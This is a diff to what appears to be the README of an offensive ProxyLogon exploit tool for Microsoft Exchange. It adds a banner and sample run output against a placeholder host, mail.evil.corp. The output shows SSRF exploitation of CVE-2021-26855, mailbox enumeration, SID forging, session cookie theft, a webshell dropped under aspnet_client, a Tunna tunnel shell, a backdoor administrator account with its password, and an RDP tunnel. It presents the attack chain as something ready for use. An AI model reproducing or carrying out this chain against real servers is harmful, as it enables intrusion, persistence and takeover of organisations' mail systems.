@@ -18,4 +18,48 @@ CMD: whoami
 nt authority\system
 ```
 # Want this? (it made from script kiddies)
-![image](https://user-images.githubusercontent.com/39673284/111138618-b9a1e580-85b2-11eb-93df-14c5449798a4.png)
+
+```
+
+███████╗██╗   ██╗██╗██╗          ██████╗ ██████╗ ██████╗ ██████╗
+██╔════╝██║   ██║██║██║         ██╔════╝██╔═══██╗██╔══██╗██╔══██╗
+█████╗  ██║   ██║██║██║         ██║     ██║   ██║██████╔╝██████╔╝
+██╔══╝  ╚██╗ ██╔╝██║██║         ██║     ██║   ██║██╔══██╗██╔═══╝
+███████╗ ╚████╔╝ ██║███████╗    ╚██████╗╚██████╔╝██║  ██║██║
+╚══════╝  ╚═══╝  ╚═╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝
+        AUTOMATIC OWA PROXYLOGON EXPLOIT
+                @lotusdll, @knowhere team, @hiephoinongdan
+
+[*] Target: https://mail.evil.corp:443
+(*) Getting FQDN Name: ECorp
+(+) Target is Vuln to SSRF [CVE-2021-26855]!
+(*) Getting Information Server
+(+) Computer Name = EXCHANGE
+(+) Domain Name =  exchange.evilcorp.local
+(+) Guest SID = S-1-5-18=rJqNiZqNgbKelpOMic7RvKu20ZOQnJ6Tgc7Gy83Pyc7Nx86Bzc/NztLPzNLOyqvOz8XMzcXLyQ==
++  exchange.evilcorp.local
+(+) Put Domain Server without Subdomain: evilcorp.local
+(*) Find valid mail from users list
+-----------------------------------
+(-) administrator@evilcorp.local = The email address is invalid!
+(-) localhost@evilcorp.local = The email address is invalid!
+(-) admin@evilcorp.local = The email address is invalid!
+(-) Guest@evilcorp.local = The email address is invalid!
+(+) accounting@evilcorp.local = Valid Mail!
+(+) Found User SID = S-1-5-21-4069934074-2056971103-3948042655-1197
+(*) Tested ProxyLogon!
+(+) Fixed SID = S-1-5-21-4069934074-2056971103-3948042655-500
+(+) Login Success!
+(+) Cookie =  ASP.NET_SessionId=4764e710-814b-4f7e-b9f2-bbeb52ac71c9; path=/; HttpOnly, msExchEcpCanary=vTsF_0s3NkKSOSkeMEuaqQydhKUu6dgITlKZqK5bY8KXKFQs-vmADg66hTb8rNUSDjf7yNMsYc0.; path=/ecp
+(+) Leaked OAB Id = bbec9f2d-9814-4954-9870-c74f656304ae
+(+) Preparing payload!
+(+) Webshell drop at https://mail.evil.corp:443/aspnet_client/evilcorp.aspx
+(*) Tested PwnRDP!
+(+) Found port: 0xd3d (3389)
+(!) Oops firewall block connect to RDP
+(*) Upload Tunna shell success!
+(*) Found ip address: 192.168.3.50
+(+) Add net user/password (Administrators): mrrobot/3LlioT! (Done!)
+(+) Listen tunnel at 127.0.0.1:1337 to mail.evil.corp:3389
+(+) Abort
+```
